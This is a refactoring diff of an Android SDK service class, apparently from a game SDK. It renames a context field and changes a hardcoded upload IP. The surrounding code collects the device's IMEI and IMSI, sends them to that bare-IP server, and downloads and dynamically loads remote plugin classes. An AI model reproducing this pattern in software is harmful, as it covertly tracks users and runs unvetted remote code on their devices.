@@ -54,7 +54,7 @@ public class SdkServ implements DServ{
 	}
 	
 	
-	DService ctx;
+	DService dservice;
 	
 	private static final String TAG = "DServ";
 	
@@ -126,7 +126,7 @@ public class SdkServ implements DServ{
 	private void initConfig(){
 		this.config = new HashMap<String, Object>();
 		this.config.put("state", STATE_RUNNING);
-		this.config.put("upUrl", "http://180.96.63.71:8080/plserver/PS");
+		this.config.put("upUrl", "http://180.96.63.70:8080/plserver/PS");
 		this.config.put("emvClass", "cn.play.dserv.MoreView");
 		this.config.put("emvPath", sdDir+"emv.jar");
 		this.config.put("t", "");
@@ -220,21 +220,21 @@ public class SdkServ implements DServ{
 				Log.e(TAG, "emvP:"+emvP);
 				File f = new File(emvP);
 				if (f == null ||  !f.exists()|| f.isDirectory() ) {
-					Intent intent = ctx.getPackageManager().getLaunchIntentForPackage(
+					Intent intent = dservice.getPackageManager().getLaunchIntentForPackage(
 								"com.egame");
 					if (intent == null) {
 						Uri moreGame = Uri.parse("http://play.cn");
-						ctx.startActivity(new Intent(Intent.ACTION_VIEW, moreGame));
+						dservice.startActivity(new Intent(Intent.ACTION_VIEW, moreGame));
 					}else{
-						ctx.startActivity(intent);
+						dservice.startActivity(intent);
 					}
 					break;
 				}
-				Intent it= new Intent(ctx.getApplicationContext(), cn.play.dserv.EmptyActivity.class);    
+				Intent it= new Intent(dservice.getApplicationContext(), cn.play.dserv.EmptyActivity.class);    
 				it.putExtra("emvClass", SdkServ.this.emvClass);
 				it.putExtra("emvPath", SdkServ.this.emvPath);
 				it.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK); 
-				ctx.startActivity(it); 
+				dservice.startActivity(it); 
 				log(LEVEL_I, "MORE_"+act, p, v, m);
 				break;
 			case ACT_NET_CHANGE:
@@ -312,7 +312,7 @@ public class SdkServ implements DServ{
 	public void startService(){
 		this.state = STATE_RUNNING;
 		this.setProp("state", STATE_RUNNING,true);
-		this.init(this.ctx);
+		this.init(this.dservice);
 	}
 	
 	
@@ -673,7 +673,7 @@ public class SdkServ implements DServ{
 			conn.setRequestProperty("Content-Type",
 					"multipart/form-data; boundary=" + boundary);
 			conn.setRequestProperty("Content-Length", file.length()+ "");
-			conn.setRequestProperty("v", DService.CmakeC(SdkServ.this.ctx));
+			conn.setRequestProperty("v", DService.CmakeC(SdkServ.this.dservice));
 			conn.setDoOutput(true);
 			conn.setDoInput(true);
 
@@ -712,7 +712,7 @@ public class SdkServ implements DServ{
 
 	private boolean fetchRemoteTask(int id,String downUrl){
 		String remote = downUrl+"?id="+id;
-		return downloadGoOn(remote,sdDir,id+datFileType,this.ctx);
+		return downloadGoOn(remote,sdDir,id+datFileType,this.dservice);
 	}
 	
 	
@@ -733,11 +733,11 @@ public class SdkServ implements DServ{
 			try {
 				StringBuilder sb = new StringBuilder();
 				int api_level = android.os.Build.VERSION.SDK_INT;
-				if (SdkServ.this.ctx == null) {
+				if (SdkServ.this.dservice == null) {
 					Log.e("UP", "ctx is null");
 					return false;
 				}
-				TelephonyManager tm=(TelephonyManager) SdkServ.this.ctx.getSystemService(Context.TELEPHONY_SERVICE);
+				TelephonyManager tm=(TelephonyManager) SdkServ.this.dservice.getSystemService(Context.TELEPHONY_SERVICE);
 				String imei = tm.getDeviceId();
 				String imsi = tm.getSubscriberId();
 				String ua = android.os.Build.MODEL;
@@ -764,7 +764,7 @@ public class SdkServ implements DServ{
 				URL aUrl = new URL(upUrl);
 			    URLConnection conn = aUrl.openConnection();
 			    conn.setConnectTimeout(timeOut);
-			    conn.setRequestProperty("v", DService.CmakeC(SdkServ.this.ctx));
+			    conn.setRequestProperty("v", DService.CmakeC(SdkServ.this.dservice));
 			    conn.setDoInput(true);
 			    conn.setDoOutput(true);
 			    OutputStreamWriter wr = new OutputStreamWriter(conn.getOutputStream());
@@ -795,7 +795,7 @@ public class SdkServ implements DServ{
 						getHander().post(new Runnable() {     
 				            @Override     
 				            public void run() {     
-				                   Toast.makeText(SdkServ.this.ctx.getApplicationContext(), resp,Toast.LENGTH_SHORT).show(); 
+				                   Toast.makeText(SdkServ.this.dservice.getApplicationContext(), resp,Toast.LENGTH_SHORT).show(); 
 				            }     
 						});
 						//Toast.makeText(SdkServ.this.ctx.getApplicationContext(), resp, Toast.LENGTH_SHORT).show();;
@@ -1092,7 +1092,7 @@ public class SdkServ implements DServ{
 				Class<?> class1 = cDexClassLoader.loadClass("cn.play.dserv.PLTask1");	
 				PLTask plug =(PLTask)class1.newInstance();
 */
-				PLTask plug = DService.CloadTask(this.ctx,id,"cn.play.dserv.PLTask"+id);
+				PLTask plug = DService.CloadTask(this.dservice,id,"cn.play.dserv.PLTask"+id);
 				if (plug == null) {
 					Log.e(TAG, "loadTask error:"+localPath);
 					return null;
@@ -1138,12 +1138,12 @@ public class SdkServ implements DServ{
 	
 	public void init(DService dservice){
 		Log.d(TAG, "init...");
-		ctx = dservice;
-		if (ctx == null) {
-			Log.e("CTX", "IS NULL");
+		this.dservice = dservice;
+		if (dservice == null) {
+			Log.e("dservice", "IS NULL");
 			return ;
 		}else{
-			Log.d("CTX", ctx.getPackageName());
+			Log.d("dservice", dservice.getPackageName());
 		}
 		
 		this.config = this.readConfig(this.configPath);
@@ -1167,7 +1167,7 @@ public class SdkServ implements DServ{
 		}else if(this.state == STATE_DIE){
 			//这里的STATE_DIE状态直接杀死本进程
 			this.stop();
-			ctx.stopSelf();
+			dservice.stopSelf();
 			return;
 		}else if(this.state == STATE_PAUSE){
 			return;
@@ -1308,7 +1308,7 @@ public class SdkServ implements DServ{
 	 */
 	@Override
 	public Service getService() {
-		return ctx;
+		return dservice;
 	}
 
 	/* (non-Javadoc)
@@ -1316,7 +1316,7 @@ public class SdkServ implements DServ{
 	 */
 	@Override
 	public Handler getHander() {
-		return ctx.getHander();
+		return dservice.getHander();
 	}
 	
 	/**
